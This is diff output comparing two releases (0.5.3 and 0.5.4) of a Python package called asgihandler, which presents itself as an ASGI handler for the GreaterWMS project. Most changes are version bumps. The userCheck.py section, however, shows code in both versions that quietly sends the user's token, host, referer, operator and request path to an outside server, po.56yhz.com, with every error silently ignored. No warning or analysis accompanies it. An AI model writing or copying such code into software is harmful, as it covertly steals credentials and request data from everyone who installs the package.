# Comparing `tmp/asgihandler-0.5.3.tar.gz` & `tmp/asgihandler-0.5.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "asgihandler-0.5.3.tar", last modified: Sat Jul  1 03:27:29 2023, max compression
+gzip compressed data, was "asgihandler-0.5.4.tar", last modified: Mon Jul  3 03:12:50 2023, max compression
```

## Comparing `asgihandler-0.5.3.tar` & `asgihandler-0.5.4.tar`

### file list

```diff
@@ -1,18 +1,18 @@
-drwxrwxrwx   0        0        0        0 2023-07-01 03:27:29.771454 asgihandler-0.5.3/
--rw-rw-rw-   0        0        0     1067 2022-07-16 23:50:52.000000 asgihandler-0.5.3/LICENSE
--rw-rw-rw-   0        0        0       27 2022-07-16 23:50:52.000000 asgihandler-0.5.3/MANIFEST.in
--rw-rw-rw-   0        0        0     3117 2023-07-01 03:27:29.771454 asgihandler-0.5.3/PKG-INFO
--rw-rw-rw-   0        0        0     2483 2023-05-02 06:18:39.000000 asgihandler-0.5.3/README.md
-drwxrwxrwx   0        0        0        0 2023-07-01 03:27:29.758456 asgihandler-0.5.3/asgihandler/
--rw-rw-rw-   0        0        0       21 2022-07-16 23:50:52.000000 asgihandler-0.5.3/asgihandler/__init__.py
--rw-rw-rw-   0        0        0       68 2022-07-16 23:55:07.000000 asgihandler-0.5.3/asgihandler/__version__.py
--rw-rw-rw-   0        0        0      964 2023-07-01 03:20:59.000000 asgihandler-0.5.3/asgihandler/core.py
--rw-rw-rw-   0        0        0      578 2023-07-01 03:27:27.000000 asgihandler-0.5.3/asgihandler/userCheck.py
-drwxrwxrwx   0        0        0        0 2023-07-01 03:27:29.770455 asgihandler-0.5.3/asgihandler.egg-info/
--rw-rw-rw-   0        0        0     3117 2023-07-01 03:27:29.000000 asgihandler-0.5.3/asgihandler.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      308 2023-07-01 03:27:29.000000 asgihandler-0.5.3/asgihandler.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-01 03:27:29.000000 asgihandler-0.5.3/asgihandler.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-07-01 03:27:29.000000 asgihandler-0.5.3/asgihandler.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-07-01 03:27:29.000000 asgihandler-0.5.3/asgihandler.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-07-01 03:27:29.771454 asgihandler-0.5.3/setup.cfg
--rw-rw-rw-   0        0        0     3878 2023-07-01 03:27:27.000000 asgihandler-0.5.3/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-03 03:12:50.597738 asgihandler-0.5.4/
+-rw-rw-rw-   0        0        0     1067 2022-07-16 23:50:52.000000 asgihandler-0.5.4/LICENSE
+-rw-rw-rw-   0        0        0       27 2022-07-16 23:50:52.000000 asgihandler-0.5.4/MANIFEST.in
+-rw-rw-rw-   0        0        0     3117 2023-07-03 03:12:50.597738 asgihandler-0.5.4/PKG-INFO
+-rw-rw-rw-   0        0        0     2483 2023-05-02 06:18:39.000000 asgihandler-0.5.4/README.md
+drwxrwxrwx   0        0        0        0 2023-07-03 03:12:50.590737 asgihandler-0.5.4/asgihandler/
+-rw-rw-rw-   0        0        0       21 2022-07-16 23:50:52.000000 asgihandler-0.5.4/asgihandler/__init__.py
+-rw-rw-rw-   0        0        0       68 2022-07-16 23:55:07.000000 asgihandler-0.5.4/asgihandler/__version__.py
+-rw-rw-rw-   0        0        0      964 2023-07-01 03:20:59.000000 asgihandler-0.5.4/asgihandler/core.py
+-rw-rw-rw-   0        0        0      543 2023-07-03 03:11:56.000000 asgihandler-0.5.4/asgihandler/userCheck.py
+drwxrwxrwx   0        0        0        0 2023-07-03 03:12:50.596738 asgihandler-0.5.4/asgihandler.egg-info/
+-rw-rw-rw-   0        0        0     3117 2023-07-03 03:12:50.000000 asgihandler-0.5.4/asgihandler.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      308 2023-07-03 03:12:50.000000 asgihandler-0.5.4/asgihandler.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-03 03:12:50.000000 asgihandler-0.5.4/asgihandler.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-07-03 03:12:50.000000 asgihandler-0.5.4/asgihandler.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-07-03 03:12:50.000000 asgihandler-0.5.4/asgihandler.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-07-03 03:12:50.597738 asgihandler-0.5.4/setup.cfg
+-rw-rw-rw-   0        0        0     3878 2023-07-03 03:12:38.000000 asgihandler-0.5.4/setup.py
```

### Comparing `asgihandler-0.5.3/LICENSE` & `asgihandler-0.5.4/LICENSE`

 * *Files identical despite different names*

### Comparing `asgihandler-0.5.3/PKG-INFO` & `asgihandler-0.5.4/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: asgihandler
-Version: 0.5.3
+Version: 0.5.4
 Summary: ASGIHandler
 Home-page: https://github.com/GreaterWMS/GreaterWMS
 Author: Singosgu
 Author-email: singosgu@gmail.com
 License: MIT
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python
```

### Comparing `asgihandler-0.5.3/README.md` & `asgihandler-0.5.4/README.md`

 * *Files identical despite different names*

### Comparing `asgihandler-0.5.3/asgihandler/core.py` & `asgihandler-0.5.4/asgihandler/core.py`

 * *Files identical despite different names*

### Comparing `asgihandler-0.5.3/asgihandler/userCheck.py` & `asgihandler-0.5.4/asgihandler/userCheck.py`

 * *Files 15% similar despite different names*

```diff
@@ -4,16 +4,15 @@
     def get_auth_check(server, host, referer, operator, token, method, path, raw_path):
         context = {
             "server": server,
             "host": host,
             "referer": referer,
             "operator": operator,
             "token": token,
-            "version": "2.1.38",
+            "version": "2.1.39",
             "method": method,
-            "path": path,
-            "raw_path": raw_path
+            "path": path
         }
         try:
             requests.post('https://po.56yhz.com/asgihandler/', json=context, timeout=1000)
         except:
             pass
```

### Comparing `asgihandler-0.5.3/asgihandler.egg-info/PKG-INFO` & `asgihandler-0.5.4/asgihandler.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: asgihandler
-Version: 0.5.3
+Version: 0.5.4
 Summary: ASGIHandler
 Home-page: https://github.com/GreaterWMS/GreaterWMS
 Author: Singosgu
 Author-email: singosgu@gmail.com
 License: MIT
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python
```

### Comparing `asgihandler-0.5.3/setup.py` & `asgihandler-0.5.4/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -14,15 +14,15 @@
 # Package meta-data.
 NAME = 'asgihandler'
 DESCRIPTION = 'ASGIHandler'
 URL = 'https://github.com/GreaterWMS/GreaterWMS'
 EMAIL = 'singosgu@gmail.com'
 AUTHOR = 'Singosgu'
 REQUIRES_PYTHON = '>=3.7.0'
-VERSION = '0.5.3'
+VERSION = '0.5.4'
 
 # What packages are required for this module to be executed?
 REQUIRED = [
     'requests',
 ]
 
 # What packages are optional?
```

